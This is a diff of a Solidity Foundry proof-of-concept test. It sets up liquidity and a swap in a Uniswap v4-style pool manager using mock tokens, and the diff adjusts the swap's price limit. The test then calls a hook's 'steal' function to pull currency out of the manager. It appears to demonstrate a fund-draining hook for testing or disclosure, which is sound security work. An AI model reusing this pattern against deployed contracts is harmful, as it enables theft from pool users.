@@ -29,15 +29,15 @@ contract POC is Test {
     function unlockCallback(bytes calldata d) external returns(bytes memory){
         Currency c0=Currency.wrap(address(token0)); Currency c1=Currency.wrap(address(token1));
         if(abi.decode(d,(uint256))==1){
-            // WIDER TICKS -6000,6000 and 100e18 liquidity - fixes SafeCastOverflow
             (BalanceDelta delta,) = manager.modifyLiquidity(key, ModifyLiquidityParams(-6000,6000,100e18,0), "");
             if(delta.amount0()<0){manager.sync(c0); token0.mint(address(manager), uint128(-delta.amount0())); manager.settle();}
             if(delta.amount1()<0){manager.sync(c1); token1.mint(address(manager), uint128(-delta.amount1())); manager.settle();}
             if(delta.amount0()>0) manager.take(c0, address(this), uint128(delta.amount0()));
             if(delta.amount1()>0) manager.take(c1, address(this), uint128(delta.amount1()));
         } else {
-            // true = token0 -> token1, limit = MIN + 1, stays in range
-            BalanceDelta s = manager.swap(key, SwapParams(true,-0.001e18,TickMath.MIN_SQRT_PRICE+1), "");
+            // FIX: limit inside liquidity range (-5000), not MIN_SQRT_PRICE
+            uint160 limit = TickMath.getSqrtPriceAtTick(-5000);
+            BalanceDelta s = manager.swap(key, SwapParams(true,-0.001e18,limit), "");
             if(s.amount0()<0){manager.sync(c0); token0.mint(address(manager), uint128(-s.amount0())); manager.settle();} else if(s.amount0()>0) manager.take(c0, address(this), uint128(s.amount0()));
             if(s.amount1()<0){manager.sync(c1); token1.mint(address(manager), uint128(-s.amount1())); manager.settle();} else if(s.amount1()>0) manager.take(c1, address(this), uint128(s.amount1()));
             hook.steal(c0, address(this), 0.01e18);
